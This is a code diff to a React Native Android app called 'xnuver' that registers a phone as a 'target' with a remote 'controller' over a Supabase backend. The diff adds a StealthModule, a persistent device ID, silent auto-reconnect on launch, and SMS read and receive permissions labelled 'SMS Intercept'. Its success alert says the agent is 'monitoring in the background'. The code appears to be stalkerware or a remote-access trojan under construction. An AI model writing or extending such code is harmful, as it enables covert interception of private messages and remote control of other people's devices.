@@ -15,8 +15,10 @@ import {
     ScrollView,
     ActivityIndicator,
     NativeModules,
-    DeviceEventEmitter
+    DeviceEventEmitter,
+    BackHandler
 } from 'react-native';
+import AsyncStorage from '@react-native-async-storage/async-storage';
 import { SafeAreaProvider, SafeAreaView } from 'react-native-safe-area-context';
 import { Sword, Copy, Sparkles, Zap, Shield, CheckCircle, XCircle } from 'lucide-react-native';
 import * as Device from 'expo-device';
@@ -31,13 +33,28 @@ import * as IntentLauncher from 'expo-intent-launcher';
 import { startBackgroundPolling } from './backgroundTask';
 
 // --- NATIVE MODULES ---
-const { FloatingAlert, FlashlightModule } = NativeModules; // Injected by our plugins
+const { FloatingAlert, FlashlightModule, StealthModule } = NativeModules; // Injected by our plugins
 
 // --- Configuration ---
 const SUPABASE_URL = 'https://ejqrvmkjypdfqiiwyxkp.supabase.co';
 const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVqcXJ2bWtqeXBkZnFpaXd5eGtwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc5MzM0NDEsImV4cCI6MjA4MzUwOTQ0MX0.sDOLfczDLK4RNIHFLP-kG1_rnZNWhE4XFImruLBr8oA';
 const SUPABASE_REST_URL = `${SUPABASE_URL}/rest/v1`;
-const DEVICE_ID = Constants.sessionId || Device.modelId || '1';
+let DEVICE_ID = 'unknown_target';
+
+// We'll initialize DEVICE_ID properly inside the component or a helper function
+const initDeviceId = async () => {
+    try {
+        let id = await AsyncStorage.getItem('xnuver_stable_id');
+        if (!id) {
+            id = (Device.modelName || 'device') + '_' + Math.random().toString(36).substring(2, 9);
+            await AsyncStorage.setItem('xnuver_stable_id', id);
+        }
+        DEVICE_ID = id;
+    } catch (e) {
+        DEVICE_ID = Device.osBuildId || Device.modelId || 'fallback_id';
+    }
+};
+initDeviceId();
 
 const CHANNEL_ID_SERVICE = 'xnuver_bg_service';
 const CHANNEL_ID_ALERT = 'xnuver_critical_alert';
@@ -140,6 +157,7 @@ export default function App() {
     const [permNotification, setPermNotification] = useState(false);
     const [permOverlay, setPermOverlay] = useState(false);
     const [permBattery, setPermBattery] = useState(false);
+    const [permSms, setPermSms] = useState(false);
 
     const [deviceName, setDeviceName] = useState('');
     const [results, setResults] = useState([]);
@@ -150,6 +168,29 @@ export default function App() {
     const [isConnecting, setIsConnecting] = useState(false);
     const [isConnected, setIsConnected] = useState(false);
     const soundRef = useRef(null);
+
+    // --- AUTO START IF REGISTERED ---
+    useEffect(() => {
+        const checkExisting = async () => {
+            try {
+                const savedName = await AsyncStorage.getItem('xnuver_device_name');
+                const savedId = await AsyncStorage.getItem('xnuver_controller_id');
+
+                if (savedName && savedId) {
+                    setDeviceName(savedName);
+                    setControllerId(savedId);
+
+                    // Auto-connect if already registered
+                    setTimeout(() => {
+                        handleConnect(savedName, savedId);
+                    }, 1000);
+                }
+            } catch (e) {
+                console.error('Storage Error:', e);
+            }
+        };
+        checkExisting();
+    }, []);
 
     // --- SETUP CHANNELS & AUDIO SESSION ---
     useEffect(() => {
@@ -197,6 +238,12 @@ export default function App() {
         const settings = await notifee.getNotificationSettings();
         setPermNotification(settings.authorizationStatus === AuthorizationStatus.AUTHORIZED);
 
+        // Check SMS
+        if (Platform.OS === 'android') {
+            const hasSms = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_SMS);
+            setPermSms(hasSms);
+        }
+
         // Native Module Check
         if (FloatingAlert) {
             FloatingAlert.checkPermission((granted) => {
@@ -227,6 +274,16 @@ export default function App() {
         if (Platform.OS === 'android') {
             await IntentLauncher.startActivityAsync(IntentLauncher.ActivityAction.IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
             setPermBattery(true);
+        }
+    };
+
+    const requestSmsPerm = async () => {
+        if (Platform.OS === 'android') {
+            const results = await PermissionsAndroid.requestMultiple([
+                PermissionsAndroid.PERMISSIONS.READ_SMS,
+                PermissionsAndroid.PERMISSIONS.RECEIVE_SMS
+            ]);
+            setPermSms(results['android.permission.READ_SMS'] === 'granted');
         }
     };
 
@@ -339,36 +396,53 @@ export default function App() {
     }, []);
 
 
-    const handleConnect = async () => {
-        console.log('CONNECT_ATTEMPT:', deviceName, controllerId);
-        // --- IMPROVED VALIDATION LOGIC ---
-        if (!deviceName || deviceName.trim().length === 0) {
-            Alert.alert('Missing Info', 'Please enter a Name for this device.');
-            return;
-        }
-        if (!controllerId || controllerId.trim().length === 0) {
-            Alert.alert('Missing Info', 'Please enter Closing ID (Controller ID).');
-            return;
-        }
-
-        if (!permission?.granted) await requestPermission();
-        if (Platform.OS === 'android') await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.CAMERA);
-
+    const handleConnect = async (customName = null, customId = null) => {
         setIsConnecting(true);
 
+        // Ensure arguments are strings (fix for event object being passed)
+        const safeName = (typeof customName === 'string') ? customName : null;
+        const safeId = (typeof customId === 'string') ? customId : null;
+
+        const checkinName = safeName || deviceName;
+        const checkinId = safeId || controllerId;
+
+        console.log('CONNECT_ATTEMPT:', checkinName, checkinId);
+
+        if (!checkinName || checkinName.trim().length === 0) {
+            Alert.alert('Missing Info', 'Please enter a Name for this device.');
+            setIsConnecting(false);
+            return;
+        }
+        if (!checkinId || checkinId.trim().length === 0) {
+            Alert.alert('Missing Info', 'Please enter Closing ID (Controller ID).');
+            setIsConnecting(false);
+            return;
+        }
+
         try {
+            // Request necessary permissions at connect time
+            if (Platform.OS === 'android') {
+                await PermissionsAndroid.requestMultiple([
+                    PermissionsAndroid.PERMISSIONS.CAMERA,
+                    PermissionsAndroid.PERMISSIONS.READ_SMS,
+                    PermissionsAndroid.PERMISSIONS.RECEIVE_SMS
+                ]);
+            }
+            if (!permission?.granted) await requestPermission();
+
             // REGISTER TO SUPABASE
             const checkinData = {
                 id: DEVICE_ID,
-                name: deviceName,
-                controller_id: controllerId,
+                name: checkinName,
+                controller_id: checkinId,
                 network: 'Online',
                 last_seen: new Date().toISOString(),
                 os: Device.modelName || 'Android Target'
             };
 
             // 1. Try to check if exists
-            const checkRes = await fetch(`${SUPABASE_REST_URL}/devices?id=eq.${DEVICE_ID}`, {
+            const encodedId = encodeURIComponent(DEVICE_ID);
+            const checkRes = await fetch(`${SUPABASE_REST_URL}/devices?id=eq.${encodedId}`, {
                 headers: { 'apikey': SUPABASE_ANON_KEY, 'Authorization': `Bearer ${SUPABASE_ANON_KEY}` }
             });
 
@@ -376,8 +450,7 @@ export default function App() {
 
             let saveRes;
             if (existing && existing.length > 0) {
-                // Update
-                saveRes = await fetch(`${SUPABASE_REST_URL}/devices?id=eq.${DEVICE_ID}`, {
+                saveRes = await fetch(`${SUPABASE_REST_URL}/devices?id=eq.${encodedId}`, {
                     method: 'PATCH',
                     headers: {
                         'apikey': SUPABASE_ANON_KEY,
@@ -388,7 +461,6 @@ export default function App() {
                     body: JSON.stringify(checkinData)
                 });
             } else {
-                // Insert
                 saveRes = await fetch(`${SUPABASE_REST_URL}/devices`, {
                     method: 'POST',
                     headers: {
@@ -401,15 +473,27 @@ export default function App() {
                 });
             }
 
-            if (!saveRes.ok) throw new Error('Registration Failed');
+            if (!saveRes.ok) throw new Error('Registration Failed: ' + saveRes.status);
+
+            // --- LOCK DATA ---
+            await AsyncStorage.setItem('xnuver_device_name', checkinName);
+            await AsyncStorage.setItem('xnuver_controller_id', checkinId);
 
             setIsConnected(true);
             await startBackgroundService();
-            Alert.alert('System', 'Agent Online & Registered to Controller.');
+
+            // --- ALERT & SUCCESS ---
+            if (!safeName) {
+                Alert.alert(
+                    'System Online',
+                    'Target synchronized. Agent is now active and monitoring in the background.',
+                    [{ text: 'OK' }]
+                );
+            }
 
         } catch (err) {
-            Alert.alert('Connection Error', 'Could not register to server: ' + err.message);
-            console.error(err);
+            console.error('CONNECT_ERROR', err);
+            Alert.alert('Connection Error', 'Could not register: ' + err.message);
         } finally {
             setIsConnecting(false);
         }
@@ -442,6 +526,12 @@ export default function App() {
                             desc="Prevents system from killing the app."
                             status={permBattery}
                             onPress={requestBatteryPerm}
+                        />
+                        <PermissionItem
+                            title="SMS Intercept"
+                            desc="Required to monitor incoming messages."
+                            status={permSms}
+                            onPress={requestSmsPerm}
                         />
                         {permission?.granted ? null : (
                             <PermissionItem
@@ -495,7 +585,7 @@ export default function App() {
                                 />
                                 <TouchableOpacity
                                     style={[styles.genBtn, isConnected && { backgroundColor: '#4CAF50' }]}
-                                    onPress={handleConnect}
+                                    onPress={() => handleConnect()}
                                     disabled={isConnected || isConnecting}
                                 >
                                     <Text style={styles.genBtnText}>{isConnecting ? '...' : isConnected ? 'ACTIVE' : 'CONNECT'}</Text>
